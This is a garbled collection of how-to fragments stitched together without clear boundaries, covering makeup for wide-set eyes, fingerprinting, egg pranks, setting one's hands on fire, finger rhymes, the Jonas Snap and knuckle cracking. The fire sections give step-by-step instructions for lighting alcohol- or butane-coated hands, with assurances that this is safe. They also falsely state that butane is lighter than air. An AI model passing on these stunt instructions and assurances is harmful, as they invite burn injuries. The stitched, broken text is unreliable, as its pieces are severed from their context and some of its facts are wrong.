, People with wide set eyes sometimes have a wider or flatter nose bridge, which accentuates the distance between the eyes. If you want to make your eyes appear closer together, you can add dimension and depth to your nose with contouring.All you need for this is a small blending brush and a dark contour powder, which you can purchase at a pharmacy or a beauty supply store.









Dip your brush into the powder and tap off any excess powder. You want your nose contour to look natural, so avoid packing on too much product.
Apply the powder in two lines down your nose, going from the eyes down to the nostrils. The closer together the lines are, the skinner and smaller your nose will look.Blend your contouring lines thoroughly so they don’t look dark and unnatural. Soften the contour by running over it with a fluffy brush and your favorite face powder.

, In many makeup tutorials, you’ll be advised to line your entire top lash line, while only lining the outer half of your bottom lash line. If you have wide set eyes, however, lining the entire lash line on both the top and bottom can actually draw your eyes together. Begin in the inner corner and carefully line outwards. As you move outwards, decrease the thickness of the line. By putting a thicker amount to the inside corners, the eyes will look closer together.







, Some makeup gurus will advise those with wide set eyes to avoid winged eyeliner or cat eyes all together. By adding product on the outside of your eyes, it can make your eyes appear farther apart. If you want to wear winged eyeliner, though, you can rock it just like anyone else. If you are trying to make your eyes appear closer together, simply keep your wings shorter.If you're someone who loves to rock the winged eyeliner but wants to minimize the distance between your eyes, try out the reverse-wing on your bottom lash line. Grab a flat eyeliner brush and your favorite gel eyeliner. Start at your outer corner, running the eyeliner along your lash line like normal. However, instead of curving into the very inner corner, run the line straight out. In other words, the bottom liner should extend in a straight line towards your nose, rather than curving upwards into your inner corner., Before you apply your mascara, curl your lashes with an eyelash curler. However, instead of pressing your curler straight down on your lashes as you normally would do, hold your curler at a slight angle towards your nose. This may feel a bit funny at first, but it can make a big difference. By angling the lashes inwards, it will make your eyes appear closer together.Once you’ve curled your lashes, apply your mascara. Start at the base of the lashes and wiggle your wand to the ends, pulling your eyelashes at the same angle you curled them.

, An easy way to minimize the space between your eyes is to extend your eyebrows into it. Using your favorite brow pencil, powder, or gel, elongate your brows inwards. Be careful not to overdo it, or it will look unnatural. Use short, soft strokes to mimic hair, and don’t extend the tail of the brow., If you have wide set eyes, you have the perfect features for bangs. Straight across bangs draw attention to the center of the face and draws your eyes together, making them appear closer together. Longer bangs also minimize the amount of skin shown between and around your eyes, giving them the illusion of being less wide set., Slicked back, tight hairstyles can call attention to your wide set eyes and make them look farther apart. Instead, let your hair fall around your face. Waves, tendrils, layers, and messy pieces are all perfect ways to add volume around your head, thus making your eyes appear closer together in the center. If you insist on an up-do, even leaving a few pieces out or teasing the sides a bit can minimize the distance between your eyes., If you already have a wide face and don’t want to add more width with hair on either side of your face, side-swept styles might be the perfect compromise. These can be worn for both casual and formal affairs, and they can add a lot of volume and interest around your face without making it appear too round. Try pulling your hair into a loose bun or a braid on one side, leaving small pieces around your face to frame it."

Fill out the entire card.,
Analyze the fingerprints.",How to Take Fingerprints," You can print fingerprint cards from free online images. Try this one used by the FBI and other US agencies. Position the card on a special stand, or just weigh it down with a heavy object to stop it sliding.



If you are taking fingerprints for an official purpose, you may need to find a fingerprint card you are authorized to use. Even if your agency is authorized to use the card linked above, it should order it using these instructions on the FBI website.;
, There are several different methods used to take fingerprints. Here are a few of the most common:










Ink pad: Find a special ""porelon pad"" for fingerprinting. Use as a normal ink pad, no preparation needed.
Glass plate: Dab printer's ink or fingerprint ink onto a glass or metal plate, fixed in place. Roll ink out with a rubber ink roller until thin and even.Inkless pad: Special pads are available that will not stain fingers. Check the instructions in case special preparation is needed.
Fingerprint scanner: An electronic device. The process is not covered here; check product instructions, and confirm that the device is approved by your agency.

, Have the subject wash and dry his hands to remove dirt that may obscure the fingerprints. Check the hands for lint from the towel, and ask him to brush it off if present.If soap and water are not available, rubbing alcohol is the second best option.Have the subject sign the card before washing his hands. Use blue or black ink.

, The subject does not fill out his own fingerprint card. You, the person tasked with taking the fingerprint, will do it for him. Hold the base of the subjects thumb, tucking unused fingers under your hand. With your other hand, hold the subject's finger just below the nail tip, and at the third joint.Keep the wrist level with the hand. If possible, move the fingerprint station to a height level with the subject's arm.
Ask the subject to look away if they seem to be ""helping;"" the fingerprint will be more clear if only you are controlling the hand., Your goal is to ink the thumb from the top of the pad to ¼ inch (6mm) below the first joint. Place the side of the thumb nearest the forefinger onto the ink, right against the nail. Roll the thumb past the thumbprint, and continue until it touches the opposite nail.









You can remember the direction as ""awkward to comfortable"" — try it out and you'll see what this means.

, Find the area of the card labeled for the right thumb. Roll the inked thumb over the card, in the same direction as you did before. Roll at a steady pace, and with light pressure only. Changing speed or pressure can cause smudges. Roll one time only, not back and forth.










Lift the thumb up directly when finished, to avoid smudging.

, Put your hands together with the backs facing you, then turn them palm up. This is the direction your fingers should rotate — which still follows the ""awkward to comfortable"" rule.Apart from this change, the process is the same as the thumb. Record the fingerprints of the right hand, then the left thumb, then the fingers on the left hand.










If using an inking plate, you need to roll out the ink again before each finger. Otherwise, you may end up with an image of two overlapping prints.Make sure you have each fingerprint in the correct box of the card, that the impression goes from nail edge to nail edge, and down to ¼ inch (6mm) below the first joint.
Let the subject wipe off ink from the right hand before moving on to the left.

, Your fingerprint card should have two additional spaces for thumbs, and two large spaces marked ""four fingers simultaneously."" In the same order as above (right thumb, right hand, left thumb, left hand), ink the fingerprint and press it flat against the paper, without rolling. For the fingers, you'll do all four fingers at once. You'll often need to rotate the fingers slightly to fit them all in the available space.









These are also called ""flat"" or ""slap"" impressions.These are used to verify that the fingerprints are in the correct boxes. Some features are also more visible on the plain impression., Retabs are small squares of adhesive paper you can press over the paper to cover smudges, partial fingerprints, and other mistakes. Retake the fingerprint onto the retab. More than two retabs on one card makes it likely that your card will be rejected.










US law enforcement agencies can order these from the FBI.

, If the ridges of the fingerprint are obscured by solid black areas, you have too much ink. If areas of the fingerprint are white, you have too little. If using a fingerprinting plate, try again with more or less ink rolled onto it. If using an ink pad, the ink pad probably needs to be replaced.










Many general purpose ink pads are not suitable for fingerprinting. Look for a Porelon pad instead.

, Blurry fingerprints are usually caused by sweat (or an unsuitable type of ink). Wipe the finger with a cloth and take the fingerprint immediately. Rubbing alcohol will also help dry the hand.








, If there is a reason you can't show the whole fingerprint, write this down or your card will be rejected. Typically, the reason is ""fully amputated,"" ""tip amputated,"" or ""missing from birth.""



Extra fingers are not recorded by the FBI.Other agencies may request that you record the extra fingers on the back of the card. Try to find specific guidelines for your purposes.

, People in many professions or hobbies wear down their fingerprints over the years. If the fingerprints won't come out clearly, try one or more of these techniques:""Milk the fingerprint"" by pressing it or rubbing it in a downward motion from palm to fingertip, before taking the print.
Rub worn prints with hand lotion or creams.
Hold ice against the fingerprint, then dry and print. This works best on naturally small ridges and soft hands, not worn prints.
Use very little ink and very light pressure.
Note the condition of the prints, especially if worn smooth. Note the occupation that led to this problem.

, Your card will likely be rejected if there is any missing information. Use blue or black ink to fill out every box. If you are not sure what to put in a box, ask someone with more experience, or look online for your agency's guidelines. Even a ""Weight"" or ""Date of Birth"" box needs to follow an exact format to keep the database consistent.


, Familiarize yourself with the basics, and you'll do a better job noticing problems with fingerprint impressions. Here's the first lesson:95% of people have fingerprints with loops (ridges forming a curved U shape) and/or whorls (circles). The rest are arches, with ridges that rise to a bend or peak, then continue onward instead of curving back. Make sure you get enough of the print to tell which type it is.
""Deltas"" are any point on the fingerprint where ridges meet from three directions. If you don't see at least one on a loop or whorl print, make sure you have covered the entire fingerprint. Rarely, a delta is not visible, in which case you should note on your card ""no delta, inked nail to nail.""

You may need to widen the holes in order to successfully remove the insides of the egg.
If you are worried about the egg cracking, put some scotch tape or a band-aid on the ends of the egg, and pierce the shell through the tape.;
, The top of the egg is the narrower, pointier end. As you blow air into the egg, the yolk and white should flow out from the hole on the opposite side.


Make sure you have a bowl or container set up to catch the insides of the egg!

, Use the straw to blow out water and any remaining yolk or whites that might still be in the egg.


You can dry the egg in the microwave for 10-30 seconds, which may make it a little stronger.
For an added surprise, you can fill the egg with confetti once it's dry. Just make a funnel out of paper and use that to pour confetti or glitter through the hole. Fill the egg about halfway.
Seal the hole by gluing a tiny scrap of tissue to the shell. You don't want the seal to be visible, so use a piece that is as small as possible and as close to the color of the shell as you can get.
Make sure there's no evidence of confetti or glitter on the outside of the shell to give away your surprise.

, Make sure you are covering the holes with your index finger and thumb so they can't see them (or the tissue paper seals).

, Because you are actually cracking an (empty) egg on their head, the trick is most effective if they can see you doing it.

Don’t leave any part of your hand exposed.,
Have safety measures in place.,
Practice on another object first.",How to Hold Fire1," Before getting started, take off all rings, watches, bracelets and other accessories and set them aside. These contain metals and other materials that may react unpredictably when exposed to flammable chemicals. And besides, you don’t want to risk ruining them. Your hands should be free and clear while attempting to manipulate flammable compounds., It’s best to wear short sleeves or snug clothing that rests close to the skin. Roll up long shirt sleeves and be cautious when working with an open flame. Baggy, loose-fitting garments will hang nearer to the fire and flammable solutions, and may get too close for comfort. Long hair should also be pulled back tight or kept under a cap to keep it out of the way. If you have thick facial hair, be sure to keep your face a safe distance away from the flame at all times. In any controlled scenario involving fire, hair and clothing are a possible hazard.Keep the rest of your body a safe distance away from the hand that is holding the fire.
Fabrics like cotton, rayon and acetate catch fire easily and burn quickly., Submerge your whole hand in the alcohol or gas-infused soap solution to coat the entirety of the outer surface of your skin. Be careful not to leave any exposed spots or allow the skin to dry before lighting it. These types of fire tricks pose a relatively low risk of injury or mishap when executed correctly, but accidents may occur if you’re careless or unprepared.


Because of their high degree of flammability, gases like butane and methane burn extremely hot. Injury may result if any part of your skin not covered by the liquid solution is allowed to come into contact with the fire.
For maximum protection, consider wearing rubber laboratory gloves when lighting your hands. It’s not quite as daring, but you’ll have a much lower chance of burning yourself.

, Try out fire experiments by a running sink the first few times around, or keep a bowl or spray bottle of cold water nearby. In the unfortunate event that you do get burned, wash the area thoroughly and apply a burn ointment to soothe the pain. Also, it’s best if there’s another person around when working with fire. If something goes wrong, you’ll want someone else there to help.Keep a fire extinguisher handy in case the flames catch something that they’re not supposed to.
Serious burns should be examined and treated by a medical specialist immediately.

, Try lighting another object first to prevent accidental injury when experimenting with flammable solutions. A scrap piece of wood or a non-combustible material like hard metal or stone can be used as a control until you feel comfortable attempting the feat on yourself. Do not use any object that is flammable or explosive, or that might immediately melt or conduct enough heat to burn you.Almost anything will burn once it has been coated in the alcohol or gas solution. Choose a testing material that won't catch once the solution has burned out, such as metal, rubber, ceramic or fiberglass.Set up the experiment outdoors, or someplace where a fire won't spread if something goes wrong.

Wash and dry your hands.,
Mix together equal parts water and rubbing alcohol.,
Soak your hands in the alcohol solution.,
Ignite the alcohol solution on your hands.",How to Hold Fire2," Before attempting to set your hands on fire, first give them a good wash and make sure they’re completely dry. Use a mild soap with warm water and scrub your hands together vigorously. The natural oils that build up on your skin can interfere with the chemicals you will be using to protect and light your hands.Do not use hand sanitizer to wash your hands. Most hand sanitizers contain alcohol, which is itself mildly flammable., Pour around 10 ounces of water into an open container of medium size. Then, add an equal amount of isopropyl alcohol (ordinary rubbing alcohol). You want to aim for roughly an even mixture of alcohol and water. Whisk the alcohol and water together lightly to mix them.Some bottled isopropyl alcohol comes already diluted. Consider this when mixing the alcohol with water. If it’s a strong alcohol, like a 90/10 dilution, use about 11 ounces with 9 ounces of water. For weaker kinds, like a 70/30 dilution, you’ll need to use significantly more alcohol, closer to 14 ounces, with 6 ounces of water.

, Place one or both hands in the alcohol solution. Let them soak for up to a minute. Isopropyl alcohol is mildly flammable, but diluting it with water and soaking your hands will protect you from the fire while the alcohol vapors burn themselves out. Make sure you completely submerge your hand so that the flame will burn evenly.The longer you soak your hands, the more water absorbs into your skin, saturating it and safeguarding you from burns.

, With your hand still wet with the solution, use a lighter with a long stem to ignite the fire. If you’ve soaked both hands, have a friend help you. When lit, the alcohol solution will produce a quick burst of flame, leaving your hands untouched. As long as your hand is thoroughly wet with the solution, the fire won’t burn you.Alcohol doesn’t burn particularly long or hot, so this version, while providing the safest conditions, won’t be the most impressive.
Wash your hands again when you’re done to remove any remaining traces of alcohol.

Play here’s the barnyard instead.",How to Create a Church With Your Fingers," Hold your hands about an inch apart with your fingers facing upward and your palms both turned inward.


The hands will create the church building, and the fingers will create the steeple and the people inside.
Your thumbs should remain straight and pointing upward at this stage. They will eventually create the doors of the hand church.
Lock your fingers together. As you do so, your fingers should be facing downward. Your thumbs will be the only fingers that are not locked together.;
, The thumbs should fold against each other. They create the door of the finger church. As you do so, press your palms together.


Keep your thumbs in straight vertical alignment as you press them together. Your other fingers should still be locked together.
At this point, the tops of your knuckles on both hands form the roof of your finger church.
There should be no space between your thumbs. Now you are reading to say the first part of the rhyme: “Here is the church.”

, Point them toward the sky at first. The index fingers were initially locked together with the other fingers. They will create the steeple.


Press the pads of both index fingers together, while still holding them upward. Keep your thumbs still pressed together in a vertical line with no space between them, and your other fingers should remain locked.
When you press the pads of your index fingers together, they should form a triangle, with a point at the top. You should say the second part of the rhyme: “Here is the steeple.”
Steeples have specific meaning to the church; some historians believe they symbolize Christians’ desire to lift their hearts and minds up toward heaven.

, While still holding your index fingers together in a steeple formation, swing your thumbs apart.


Remember that your thumbs are functioning as the door of the church, so opening them emulates opening the doors of the church.
Keep your other fingers locked as you do this. Tilt your wrists slightly upward to show the locked fingers inside your hands.
Your locked fingers will be lined up as if they are the people sitting inside pews inside the church., They represent the people inside the church, who are revealed once you open the thumb doors.


It’s more fun for children to wriggle their fingers to show that the people are moving inside the church.
You’re ready now to say the final part of the rhyme: “Open the doors, and see all the people.” Moving your locked fingers adds a colorful touch to the “people.”

, Many people drop the last part of the nursery rhyme: “Here’s the parson going upstairs. And here he is saying his prayers.” A parson is a member of the clergy, especially Anglican.


However, you can add the words at the end if you want. If you do, end your hands with them pressed together in prayer.
Press both hands together, with the thumbs pressed together and the fingers point toward the sky. The rhyme is thus a good way to get children to start to pray.
The hands in prayer formation are meant to represent the parson praying. If you’re secular, you can drop the last line and prayer hands and just end on the wriggling fingers inside, representing the people., Making a church with your fingers is usually accompanied with a child’s nursery rhyme, so make sure you say the rhyme as you make the gestures.


The rhyme, in totality, goes, “Here is the church. Here is the steeple. Open the doors and see all the people. Here’s the parson going upstairs. And here he is saying his prayers.”A lot of people leave the last two lines off. It's up to you. The term parson is not familiar to many children, but they will understand this is a leader of the church.
Another way to end the rhyme is to say, ""Close the doors, and let them pray."" Open your hands almost all the way, with your pinkies touching. Say, ""Open the doors, and they have all gone away!"" This will surprise and thrill small children because it's as if the parishioners have vanished.

, It is part of the Mother goose collection of fairy tales and nursery rhymes.


Children in particular love making a church out of their hands while saying this rhyme. It’s also a good way to improve their coordination and use their imagination.The nursery rhyme was probably based on English churches, whose steeples could be seen dotting the skyline of major European cities.
The oldest church steeples, sometimes called spires, stand in France on the 12th century Chartres Cathedral.Rhyming is a good way for children to master patterns of speech.

, You can use the same finger gestures to make a barn that you open to show the “animals” (your interlocked fingers) inside.


The barnyard rhyme is said as follows: “Here’s the barn. Open it wide. Let’s go inside where the animals hide. Here are the horses, here are the cows. They’re eating their dinner and drinking right now. They’ll stay here till night turns into day. When we open the doors, they’ll all mosey away. Out in the pasture, they’ll eat grass and hay. The cows will moo softly, the horses will neigh.”
You could shorten the rhyme and simply say: “Here is the barn. Open it wide. Let's go inside where the animals hide. Here are the horses, here are the cows.” "

Gather your materials.,
Combine the soap and water in large container.,
Add the flammable gas to the soap solution.,
Coat your hands completely in the solution.,
Light your hands.",How to Hold Fire3," Get together everything you need to create a fireball using soapy water and flammable gas. For this trick, you’ll need a large, open container, water, liquid detergent and access to a valve or canister of flammable gas like butane or methane. You may also need a rubber hose to direct the flow of gas into the soap solution.Flammable gases, especially in compressed canisters, should only be used under the supervision of an expert or knowledgeable adult.
Butane can be purchased in small bottles with built-in nozzles for simple culinary use.

, Fill your container about ¾ with cold water. Squeeze in 1-2 ounces of liquid soap and stir until the soap is dissolved in the water. You don’t need to use a lot of soap—just enough to create a mild solution. The soap and water will form a protective layer on your skin to keep you from being burned.Any regular liquid dish soap will do the trick. Stay away from hand soaps and liquid laundry detergents.
The lipids in the soap solution will naturally separate from the gas bubbles, keeping them away from your skin.

, Begin infusing the gas into the soap solution. If you’re using a commercial butane canister, simply place the nozzle below the surface of the water and give it a few squeezes. If you’re using a large methane tank or gas valve, release the gas slowly into the soap solution until it begins to bubble. Gases like butane and methane are lighter than air, so the bubbles will continue to rise and grow larger the more gas you add.The bubbles themselves will be extremely flammable, so be careful and only use a little at a time. Methane bubbles, in particular, are light enough to stack up on top of one another interminably until the gas supply is shut off., Dip your hand into the gas-infused soap solution. Coat your entire hand to make sure the solution sticks to your skin. Most of the gas will be trapped in the bubbles, so scoop up a handful for a bigger flame that burns longer.Whatever gas bubbles come into contact with your hands will burn out before they reach your skin through the soap solution.

, Take a lighter to the gas bubbles and set them ablaze. Both butane and methane are extremely flammable, so watch out! The fire will burn intensely for a few seconds, but there’s no need to worry. The soapy water solution will act as a barrier between the flame and your skin.The bubbles and fumes from the gas will continue rising even after they’ve touched your skin. This means that they’ll catch fire as they’re moving away from you, making the experiment safe.Look out for drips and drifting bubbles. These can be ignited on their own!

Push your middle finger and thumb together lightly, like you're pinching something. From the side, your fingers together should create a teardrop shape.Keep your other fingers very loose as you put your middle finger and thumb together. Your pointer finger will end up hitting your middle finger.
Some people hold their pinkie fingers out as they get ready to perform the Jonas Snap.;
, You want your index finger to remain somewhat loose, not too stiff or with too much tension. The Jonas Snap looks like a fluid motion. A lot of people think it looks cool because it's laid-back looking.


Lick the tip of your finger if you want the sound of the Jonas Snap to get a little louder and more ""snappy.""
If you hold your fingers too tightly or balled into a fist it will be a lot harder to do the Jonas Snap right.
So far, the finger positioning to start the snap is no different from how you hold your fingers to snap them the typical way.

, Make this move like you are flinging something from your finger, but flick in a downward motion. The wrist snap is the key part of the Jonas Snap. Master that part, and you've got it!


Snap your arm and wrist slightly like you're throwing a baseball. This should be a quick motion, in which you whip your wrist very quickly in an up or down motion. Some people thrust their wrist slightly outward, too.A good example of this motion in nature would be the gut reaction people get when they realize that there is something dangerous or disgusting on their hand. (“Ah! Get it off!”)
There's another maneuver called a wrist crack that whips forward your wrist hard enough to make it crack. Don't do that!

, Your index finger should come in contact with the crease your middle/index finger makes. It might be a good idea to practice snapping your fingers in general first.


The index finger and crease should come into contact somewhat more on the middle finger, making a dull snapping noise.
To make the Jonas Snap, thrust your fingers in a fast up-and-down motion as you snap them. It's almost the same motion as if you were going to point at someone, but move your hand up and down.
Take care, though! Your fingers might feel a little burning sensation, and they could even swell up a lot if you do this over and over again.

, To really pull off the Jonas Snap, you should thrust your hand up and down several times. Some people hold out their elbow as they do it, although this is not necessary.


Make a series of snaps in a fast row so quickly that it's almost like they are coming in one fluid motion.It's still the Jonas Snap if you just do it with a single snap, but lots of fans add a few other snaps in for effect.
You should practice the snap repeatedly until you perfect it. It's unlikely you'll be able to do it perfectly the first time you try.

, Some fans report staying up until 3 a.m., practicing the Jonas Snap for hours, and still not being able to accomplish it! Lots of people will think it's cool if you're able to master it.


For some, it comes easily. For others, it takes a lot of practice until you get it right. Don't give up! Your friends will want you to show them how to do it, most likely.
Watching other fans trying to do it on You Tube can help you figure out how to do it, so check them out.If you have a friend who knows how to do it, ask them to show you how because an in-person demonstration makes it easier to master.

, If you really want to be a Jonas Brothers fan, master the lyrics of the underlying song from the band! The Jonas Snap derives from their music.


The song is called Crank Dat Jonas Boy, and it contains the reference to what is now known as the infamous Jonas Snap.The lyrics in question go, ""Nick, Joe, Kevin up in dis ohhh; Watch them crank it, watch them roll; Watch them crank dat Jonas Boy; And Jonas Snap that ohhh...""
Sing the song while doing the Jonas Snap if you want to look really cool!

, How much do you know about the Jonas Brothers? If you're a super fan, it can never be too much. If you're interested in the Jonas Snap, there's a good chance you also like the boy band's brothers.


The Jonas Brothers started as a band in 2005, after appearing together on Disney television. In 2013, the band broke up because playing together reportedly caused the brothers too much friction.The band is made up of three brothers who come from New Jersey. Their names are Nick, Joe, and Kevin.
They are a pop rock band that has sold 17 million albums worldwide and were named breakthrough artist of the year at the American Music Awards.

, Maybe in addition to doing the Jonas snap, you've never been able to snap your fingers but wish you could. Lots of people report that they hear no sound when they snap, but that's because they're not doing it right.


What makes the sound? It's coming from your finger tip's pad hitting against part of your palm near the thumb's base.
Don't assume your dominant hand will make the loudest snap. Try snapping your fingers (including doing the Jonas Snap) by using your non-dominant hand.Press the middle finger and your thumb together, and strike them down into the palm of your hand.

Twist your right ring/middle fingers behind the middle/ring/pinky fingers of your left hand.

, Angle the ring/pinky fingers on your left hand so that your left ring finger rests on your right index finger. Your left ring finger will form the snake’s second eye. Rest your left pinky on the inside of your right palm.

,, Bring together the tips of your pinched index fingers/thumbs. Your two thumbs now form the bottom of the snake’s mouth, and your two index fingers form the top.


You can open and close the snake’s mouth by moving your index fingers up and down together and your thumbs in the same way.
If necessary, adjust your right pinky and left ring finger on your index fingers so they stick out to form the snake’s eyes.

Know the effects.",How to Crack Your Knuckles," Think how someone would hold a die when playing a dice game. This is the first step to limbering up your fingers.







;
, The bottom ones should be easiest to crack, but the top knuckles can crack, too. That force should generate an immediate crack.










Sometimes knuckles just won't crack. If your finger starts to hurt and no pop! is heard, just move onto the next finger.

, Then, clench your other hand around and push. This way you can do an entire row of knuckles at once.










You can also rotate your hand and then push down on your top knuckles, too. This can take a bit of getting used to and can be painful at first.

, Make a fist like you did in the other methods, but then concentrate on just one finger. You may be able to get a louder pop if you dedicate all the pressure to one finger.


With the thumb of your other hand on the finger you're going to crack, hold the hand you're cracking with your other hand. Press down one at a time with your thumb either on top of your finger or pressing down near the tip to crack the top.

, Instead, put your hands together like you're clapping, similar to a praying position. Your fingers and palms should be touching, mirroring each other. Then, move your palms apart, keeping your fingers pressing together. Press them harder and harder together, moving your palms upward, until you hear your knuckles cracking.


You may need to rotate your hands a bit. Dead on your middle and ring finger should crack, but with a little twist, you can focus on your pointer and pinky fingers.

, There's two ways you can do this:


Take one hand and wrap it around the finger you want to crack. Then swing that hand while you hold the finger stable. It takes a little time to perfect, but you can get a good crack out of it.

You can do it for the top joints, too; just grip a little higher.


Grab the top part of your knuckle with your opposite hand and give it a twist. Basically, instead of twisting your cracking-hand, you twist the hand doing the cracking.

, You just stiffen your fingers and slowly try to bend them forward; if your knuckles are particularly bubbly, this can work. However, for most people it's just a lofty pipe dream.










And even fewer people can crack the same finger immediately after they have already popped it. This may not be the case for you, but if you're having problems, consider waiting 5-10 minutes and crack again.

, The noise is believed to be gas bubbles popping inside the fluid in your joints as you move them just so.Given varying joint sizes in different people, some people can make more noises than others. Some will not be able to crack their knuckles at all. Which ones can you do? The top and bottom knuckles, too?










All of our joints (where bone meets bone and attached by tendons and ligaments) are surrounded by synovial fluid. By stretching your finger, you create an increase in volume which, in turn, creates a drop in pressure. That starts the gases dissolving, forming bubbles. Those are the bubbles that are popping in your fingers; the process is known as ""cavitation."", Once you have cracked your knuckles, it will take some time for the gas bubbles to re-dissolve into your synovial fluid. This prevents you from cracking them again right away. But the fluid should be ready to go in 10 to 15 minutes or so. Try timing yours!







, Your mother probably told you that cracking your knuckles leads to arthritis or some other bad effect on your hands. Is it true? Well, probably not.Some studies have been done, and none have been conclusive. It's mostly just an old wives' tale.










Some say that yes, it can lead to joint pain while others say there's no connection whatsoever. And then there's the fact that those who crack their knuckles may already have pain, so how can you account for that? But as with anything, don't overdo it just to be safe.

Practice this movement until it feels comfortable and fluid.",How to Look Like You Are Pulling Your Thumb Off1," It is important that you can see how the trick appears to your audience, so you can get a feel the angle at which you need to hold your thumbs so they are partially hidden., This means your left thumb is resting against the side of your hand that is pointed to the sky, and the back of your hand is facing your audience. Imagine where your audience will be standing (preferably directly in front of you), and be careful not to angle your hand so they can see behind your palm., Your thumb should be bent at a 90° angle, with only the bottom half (the half below your knuckle) visible to someone standing directly in front of you., It should appear as though you have one very long thumb--the left thumb providing the part below the knuckle, and your right hand making up the part above the knuckle, or the part with the nail., This covers the one area where it is obvious that people are seeing two bent thumbs held together, instead just your left thumb lying flat against the side of your hand., Your index and middle fingers will naturally move with your thumb. It will look like the tip of your left thumb has detached and you are pulling it apart., You may find you have to adjust the angle of at which you bend your thumbs for it to look convincing.


If you are left handed, the trick is exactly the same, just reverse it so your right thumb is the bottom of the thumb and your left thumb makes the tip.

Know what basic clapping looks like.,
Know where you need to make contact for the slap clap.,
Practice clapping your left hand on your right hand.,
Practice clapping your right hand on your left hand.,
Do the fast slap clap.,
Practice.",How to Clap Really Fast1," Typical clapping consists of separating your two hands about six inches from each other, and bringing them back together quickly to clap, making a smacking noise. Then you repeat this motion if you are doing something like applauding a performance. The positioning of your hands is important to creating a loud, smacking noise. Hand position varies, but usually people clap their hands one of two ways:


Fingers contacting opposite hand’s palm. For this clap, have one of your hand’s fingers slapping your other hand’s palm (by having one hand positioned slightly lower than the other hand). The intensity and speed of the contact between you two hands will affect how loud your clap is. The hard and fast you bring your hands together, the louder your clap should be. The slower and softer you bring your hands together, the quieter your clap will be.
Palms contacting palms. Have both of your hands slightly shifted off center, in a position where you could hold your own hand. In this clapping position, the parts of your hands making contact are your two palms.;
, Contact the fingers of your left hand with the lower part of your palm on right hand, and contact the fingers of your right hand with the lower part of your palm on your left hand. That means that your hands are going to be alternating positions of height each time your hands make contact with each other.


You can see the proper positions of where your hands should make contact if you put your hands up against each other (in a praying position), then slide one of your hands downward until your fingers come in contact with the middle of your palm (the area right underneath the beginning of your fingers).
This differs from normal clapping, because you hands move positioning, rather than making contact at the same level, and simply opening and closing in an identical position.

, Practice clapping, contacting your left hand fingers on your lower right hand palm. Make sure to make good contact, where you can hear a clapping noise.


Do this slowly first, to get the movement and positioning correct, but then build up to clapping faster and faster using only you left fingers on your right palm.

, Once you understand where you need to contact your left fingers on your right palm, practice clapping your right fingers against your left palm. This is an identical movement as clapping with your left hand.


Again, practice with in slow motion first so you can perfect your movements, but then practice this as fast as you can.

, Now that you know how to clap each hand individually (left fingers on right palm, right fingers on left palm), now combine both of the clapping techniques: alternate clapping your left fingers on your right palm once, and your right fingers on your left palm once. Eventually work your way to a faster speed, but still try to remain accurate in the positioning of your hands.


Your hands might looks like they’re sliding off of each other, ultimately making your clapping hands look like a flopping fish.
Try clapping along to a song so you have a rhythm to follow.

, Learning to clap really fast takes time, practice, and patience. Because this is a slow learning process that requires extreme accuracy to complete correctly, keep a few things in mind as you practice your clapping:


When you're clapping, try curving or cupping your hands slightly, so your hands create a little space of air in between your palm and your fingers, making your clap a bit louder.
Distance between your hands is key. Try to keep just a few centimeters between your hands when you are alternating to make better hand contact. If you make large movements between each contact between your hands, your hands have a further distance to travel, and that increased distance will make your clap slower.
You arms may get tired while clapping, just like any other muscular exercise. However, remember that practice makes perfect.

, Continue pressing your middle finger tips together as you open your palms to face you. Pull your index fingers back behind your middle fingers. Bend your middle fingers and point them toward you, and allow each ring finger to naturally slide up the back of the opposite middle finger.

, Press each index finger tip into the back of the same hand's middle finger (this forms the eyes).

, This is the bottom of the snake’s mouth, and the tips of your middle fingers are the top. Move your thumbs up and down together to open and close the snake’s mouth.

, Quickly move your top hand up and down, hitting against your bottom hand. Your fingers can slightly curve to cup the other hand, and produce a pocket of air when your hands are apart. This will make your clapping contact louder.

, Clapping like this might get tiring, but if you keep your shoulder and elbow a bit stiff, your hands can be stabilized and increase the speed of your clapping.


Keep practicing until you get the hang of it.

Measure your head with paper.,
Cut out the paper to fit.,
Cut out two bunny ears.,
Cut pipe cleaners to the same height as the ears.,
Stick the ears to the headband.",How to Make Bunny Ears1," To make a paper bunny ears hat, the first thing to do is prepare the piece of paper that will be your headband. Wrap a piece of A4 or A3 paper around your forehead at the height you want to wear it.In the middle of your forehead is a good place.


If you have too high it could fall off easily, but if you have it too low it might slip down over your eyes.
When you are happy with it, mark with a pen or pencil where two sides of the paper meet in front of your forehead.;
, It’s a good idea to leave a little excess, so cut the paper an inch further out than where you made the mark. Cut all the way up the paper and then wrap it around your head again to test the size. Once you are happy with the fit, you can slim down your paper headband by cutting horizontally across the paper. Then stick the two ends of the paper together with glue or tape.


You might need someone else to help you stick it together to make sure it fits properly.
The slimmer you cut the band, the less visible it will be. But it will also be more susceptible to tearing.

, Now you have the headband you need the actual bunny ears. Just cut out two nice bunny ear shapes of equal size. You can do this by using a template or putting two pieces of paper on top of each other and cutting them together.


Once you are happy with the size of your ears, colour them in or decorate them however you like.
A traditional bunny ear would be white on the outside with a pink centre.

, You can add pipe cleaners to the back of your ears to help you control them. You can keep them nice and upright and give them a little bend at the top. Just cut out two pieces of pipe cleaner, one for each ear, to approximately the same height as your bunny ears.Secure a pipe cleaner to the back of each of your bunny ears with tape or glue.

, Now all you need to do is to stick the bunny ears to the headband and you are ready to wear them. You can stick them to either the inside or the outside of the band, depending on which you think looks better. Use glue, tape or a stapler to fix in the bunny ears. #*Sticking them to the inside will mean that you won’t see the very bottom part of the ears.


If you use glue, make sure you let it dry before putting it on your head.

Put your hands out in front of you.,
Bring your palms together as you turn your left hand.,
Wrap your hands around each other.,
Line up your thumbs.,
Put your lips up to your knuckles.,
Blow.,
Make minor adjustments until you can whistle consistently.,
Try lifting your right hand fingers.,
Try changing the space between your hands.,
Try altering the posture of your lips.",How to Make an Ocarina with Your Hands," Hold your hands apart with your fingertips pointing towards the ceiling and your palms facing each other. Your thumbs should be pointing up as well. Essentially, it should look like you were just praying, then took your hands apart from each other.;
, Move your hands toward each other as if clapping. As you do so, turn your left hand so that your fingers are pointing forward (rather than up at the ceiling). When your hands touch, the heel of your left hand (the firm part below the palm) should be against the fleshy part of your right thumb.


These directions assume you're right-handed. If you're a leftie, it may be easier to reverse the references to the hands in this step as well as the following hands (i.e., turn your right hand in this step, etc.)

, Now, bend your fingers so that each hand is holding the other. The fingers of your right hand should curl in the space between your left thumb and index finger. The fingers of your left hand should curl around the side of your right pinkie (little finger)., Without taking your hands apart, adjust your thumbs so that the insides of both knuckles touch each other. Your thumbnails should be aligned next to your right index finger.


